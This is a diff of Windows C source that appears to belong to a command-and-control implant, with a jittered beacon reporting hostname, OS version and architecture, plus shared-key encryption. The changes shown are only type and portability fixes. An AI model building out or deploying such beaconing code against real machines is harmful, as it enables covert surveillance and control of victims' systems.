@@ -99,7 +99,7 @@ char* encrypt_data(const char* data, const char* shared_key) {
 }
 
 char* decrypt_data(const char* encrypted, const char* shared_key) {
-    char* dup = strdup(encrypted);
+    char* dup = _strdup(encrypted);
     if (!dup) return NULL;
 
     char* salt_b64 = strtok(dup, ":");
@@ -199,12 +199,15 @@ void send_beacon() {
              "\"type\": \"%s\", "
              "\"platform\": \"Windows\", "
              "\"arch\": \"%s\", "
-             "\"osver\": \"%d.%d.%d\", "
+             "\"osver\": \"%lu.%lu.%lu\", "
              "\"hostname\": \"%s\""
              "}}",
-             CVER, TYPE, 
+             CVER, 
+             TYPE, 
              sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ? "x64" : "x86",
-             osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber,
+             osInfo.dwMajorVersion, 
+             osInfo.dwMinorVersion, 
+             osInfo.dwBuildNumber,
              hostname);
     
     send_command(beacon);
@@ -216,10 +219,11 @@ void sleep_ms(int milliseconds) {
 
 // Function to get a retry interval
 int get_retry_interval(int retries) {
-    if (retries < sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0])) {
+    size_t num_intervals = sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0]);
+    if ((size_t)retries < num_intervals) {
         return RETRY_INTERVALS[retries];
     }
-    return RETRY_INTERVALS[sizeof(RETRY_INTERVALS) / sizeof(RETRY_INTERVALS[0]) - 1];
+    return RETRY_INTERVALS[num_intervals - 1];
 }
 
 // Function to convert UTF-8 to UTF-16
@@ -233,6 +237,7 @@ WCHAR* utf8_to_utf16(const char* str) {
 
 // Function to simulate setInterval for beacon
 DWORD WINAPI beacon_interval_thread(LPVOID lpParam) {
+    (void)lpParam;
     while (!exit_process) {
         sleep_ms(BEACON_MIN_INTERVAL + (rand() % (BEACON_MAX_INTERVAL - BEACON_MIN_INTERVAL + 1)));
         
